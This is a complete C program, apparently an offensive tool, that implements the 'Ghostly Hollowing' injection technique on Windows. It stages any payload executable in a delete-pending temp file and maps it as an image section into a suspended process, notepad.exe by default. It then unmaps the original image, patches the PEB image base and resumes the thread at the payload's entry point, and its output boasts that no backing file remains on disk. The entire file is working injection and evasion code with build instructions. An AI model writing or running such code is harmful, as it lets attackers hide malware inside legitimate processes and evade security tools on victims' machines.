#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>

// ============ NATIVE API TYPEDEFS ============
typedef NTSTATUS(NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress);

typedef NTSTATUS(NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

// ============ GLOBAL FUNCTION POINTERS ============
pNtCreateSection NtCreateSection = NULL;
pNtMapViewOfSection NtMapViewOfSection = NULL;
pNtUnmapViewOfSection NtUnmapViewOfSection = NULL;
pNtQueryInformationProcess NtQueryInformationProcess = NULL;

// ============ PE HELPER FUNCTIONS ============
BOOL IsValidPE(LPVOID pImage)
{
    if (!pImage)
        return FALSE;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

#ifdef _WIN64
    if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
        return FALSE;
#else
    if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
        return FALSE;
#endif

    return TRUE;
}

DWORD GetImageSize(LPVOID pImage)
{
    if (!IsValidPE(pImage))
        return 0;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    return pNt->OptionalHeader.SizeOfImage;
}

DWORD GetEntryPointRVA(LPVOID pImage)
{
    if (!IsValidPE(pImage))
        return 0;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    return pNt->OptionalHeader.AddressOfEntryPoint;
}

ULONG64 GetImageBase(LPVOID pImage)
{
    if (!IsValidPE(pImage))
        return 0;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    return pNt->OptionalHeader.ImageBase;
}

// ============ INITIALIZE NATIVE APIS ============
BOOL InitNativeAPIs()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
        return FALSE;

    NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    return (NtCreateSection && NtMapViewOfSection &&
            NtUnmapViewOfSection && NtQueryInformationProcess);
}

// ============ READ PAYLOAD FROM FILE ============
LPVOID ReadPayloadFromFile(LPCSTR lpFilePath, PDWORD pdwPayloadSize)
{
    HANDLE hFile = CreateFileA(
        lpFilePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open payload file: %d\n", GetLastError());
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        printf("[-] Failed to get file size\n");
        CloseHandle(hFile);
        return NULL;
    }

    LPVOID pBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuffer)
    {
        printf("[-] Failed to allocate buffer\n");
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, pBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        printf("[-] Failed to read payload\n");
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *pdwPayloadSize = fileSize;

    if (!IsValidPE(pBuffer))
    {
        printf("[-] Invalid PE file\n");
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        return NULL;
    }

    printf("[+] Payload loaded: %zu bytes, EntryPoint RVA: 0x%04x\n",
           fileSize, GetEntryPointRVA(pBuffer));

    return pBuffer;
}

// ============ CORE: CREATE GHOST SECTION ============
BOOL CreateGhostSection(
    IN LPVOID pPePayload,
    IN DWORD dwPayloadSize,
    IN HANDLE hTargetProcess,
    OUT PVOID *ppMappedBase)
{
    HANDLE hTempFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL;
    WCHAR tempPath[MAX_PATH] = {0};
    WCHAR tempFile[MAX_PATH] = {0};
    NTSTATUS status;
    BOOL result = FALSE;

    printf("[*] Creating ghost section...\n");

    // 1. Get temp directory path
    if (GetTempPathW(MAX_PATH, tempPath) == 0)
    {
        printf("[-] GetTempPathW failed: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Create unique temp filename
    if (GetTempFileNameW(tempPath, L"GH", 0, tempFile) == 0)
    {
        printf("[-] GetTempFileNameW failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Temp file: %ws\n", tempFile);

    // 3. Create file with DELETE_ON_CLOSE flag
    hTempFile = CreateFileW(
        tempFile,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);

    if (hTempFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW failed: %d\n", GetLastError());
        return FALSE;
    }

    // 4. Write payload to temp file
    DWORD bytesWritten;
    if (!WriteFile(hTempFile, pPePayload, dwPayloadSize, &bytesWritten, NULL) ||
        bytesWritten != dwPayloadSize)
    {
        printf("[-] WriteFile failed: %d\n", GetLastError());
        CloseHandle(hTempFile);
        return FALSE;
    }

    printf("[+] Payload written to temp file\n");

    // 5. Create SEC_IMAGE section from the file handle
    status = NtCreateSection(
        &hSection,
        SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE, // CRITICAL: Load as executable image
        hTempFile);

    if (status != 0)
    {
        printf("[-] NtCreateSection failed: 0x%08lx\n", status);
        CloseHandle(hTempFile);
        return FALSE;
    }

    printf("[+] SEC_IMAGE section created: %p\n", hSection);

    // 6. Close file handle - file enters DELETE-PENDING state
    CloseHandle(hTempFile);
    printf("[*] File handle closed - file marked for deletion\n");

    // 7. Map the ghost section into target process
    PVOID pViewBase = NULL;
    SIZE_T viewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        hTargetProcess,
        &pViewBase,
        0,    // ZeroBits
        0,    // CommitSize
        NULL, // SectionOffset
        &viewSize,
        2,                // ViewShare
        0,                // AllocationType
        PAGE_EXECUTE_READ // Win32Protect
    );

    if (status != 0)
    {
        printf("[-] NtMapViewOfSection failed: 0x%08lx\n", status);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Ghost section mapped at: %p (target process)\n", pViewBase);

    *ppMappedBase = pViewBase;
    CloseHandle(hSection);

    return TRUE;
}

// ============ CORE: PEB PATCHING ============
BOOL PatchPebImageBase(
    HANDLE hProcess,
    HANDLE hThread,
    PVOID pNewImageBase,
    PVOID pMappedBase)
{
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx))
    {
        printf("[-] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

// Get PEB address from thread context
#ifdef _WIN64
    PVOID pebAddress = (PVOID)ctx.Rdx; // RDX points to PEB on x64
#else
    PVOID pebAddress = (PVOID)ctx.Ebx; // EBX points to PEB on x86
#endif

    printf("[+] PEB address: %p\n", pebAddress);

    // Read original ImageBaseAddress from PEB
    ULONG64 originalImageBase = 0;
    SIZE_T bytesRead;
    ReadProcessMemory(
        hProcess,
        (BYTE *)pebAddress + 0x10, // ImageBaseAddress offset in PEB
        &originalImageBase,
        sizeof(originalImageBase),
        &bytesRead);

    printf("[*] Original PEB ImageBase: 0x%llx\n", originalImageBase);

    // Unmap original executable
    NtUnmapViewOfSection(hProcess, (PVOID)originalImageBase);
    printf("[+] Original image unmapped\n");

    // Write new ImageBaseAddress to PEB
    ULONG64 newImageBase = (ULONG64)pNewImageBase;
    SIZE_T bytesWritten;

    if (!WriteProcessMemory(
            hProcess,
            (BYTE *)pebAddress + 0x10,
            &newImageBase,
            sizeof(newImageBase),
            &bytesWritten))
    {
        printf("[-] WriteProcessMemory (PEB) failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] PEB ImageBase patched to: 0x%llx\n", newImageBase);

    // Set thread context to payload entry point
    DWORD entryPointRVA = GetEntryPointRVA(pMappedBase);
#ifdef _WIN64
    ctx.Rip = (DWORD64)pNewImageBase + entryPointRVA;
#else
    ctx.Eip = (DWORD)pNewImageBase + entryPointRVA;
#endif

    if (!SetThreadContext(hThread, &ctx))
    {
        printf("[-] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Thread context set to entry point: %p\n", (PVOID)ctx.Rip);

    return TRUE;
}

// ============ MAIN GHOSTLY HOLLOWING FUNCTION ============
BOOL GhostlyHollowing(
    LPCSTR lpPayloadPath,
    LPCSTR lpTargetProcess)
{
    BOOL result = FALSE;
    LPVOID pPayload = NULL;
    DWORD dwPayloadSize = 0;
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    PVOID pMappedBase = NULL;

    printf("[*] Starting Ghostly Hollowing...\n");

    // 1. Read payload PE file
    pPayload = ReadPayloadFromFile(lpPayloadPath, &dwPayloadSize);
    if (!pPayload)
        return FALSE;

    // 2. Create target process in SUSPENDED state
    if (!CreateProcessA(
            lpTargetProcess,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Target process created. PID: %d\n", pi.dwProcessId);
    printf("[+] Thread suspended\n");

    // 3. Create ghost section and map into target
    if (!CreateGhostSection(pPayload, dwPayloadSize, pi.hProcess, &pMappedBase))
    {
        printf("[-] CreateGhostSection failed\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    // 4. Patch PEB and set thread context
    if (!PatchPebImageBase(pi.hProcess, pi.hThread, pMappedBase, pPayload))
    {
        printf("[-] PatchPebImageBase failed\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    // 5. RESUME THREAD - GHOST PROCESS EXECUTES!
    printf("\n[!] Resuming thread - GHOST PROCESS ACTIVATED!\n");
    ResumeThread(pi.hThread);

    printf("[+] Ghostly Hollowing successful!\n");
    printf("[+] PID: %d is running GHOSTED payload\n", pi.dwProcessId);
    printf("[+] No backing file on disk!\n");

    // Cleanup
    VirtualFree(pPayload, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

// ============ MAIN ============
int main(int argc, char *argv[])
{
    printf("========================================\n");
    printf("     Ghostly Hollowing - x64 Windows\n");
    printf("     Works on Windows 10/11 (22H2+)\n");
    printf("========================================\n\n");

    // Initialize Native APIs
    if (!InitNativeAPIs())
    {
        printf("[-] Failed to initialize Native APIs\n");
        return -1;
    }

    char payloadPath[MAX_PATH] = {0};
    char targetPath[MAX_PATH] = "C:\\Windows\\System32\\notepad.exe";

    if (argc >= 2)
    {
        strcpy(payloadPath, argv[1]);
    }
    else
    {
        printf("[*] Usage: %s <payload_path> [target_process]\n", argv[0]);
        printf("[*] Example: %s C:\\calc.exe\n", argv[0]);
        return 0;
    }

    if (argc >= 3)
    {
        strcpy(targetPath, argv[2]);
    }

    printf("[*] Payload: %s\n", payloadPath);
    printf("[*] Target:  %s\n\n", targetPath);

    if (GhostlyHollowing(payloadPath, targetPath))
    {
        printf("\n[+] Ghostly Hollowing completed successfully!\n");
    }
    else
    {
        printf("\n[-] Ghostly Hollowing failed\n");
    }

    system("pause");
    return 0;
}

// x86_64-w64-mingw32-gcc -o ghostly_hollowing.exe ghostly_hollowing.c -lntdll -lpsapi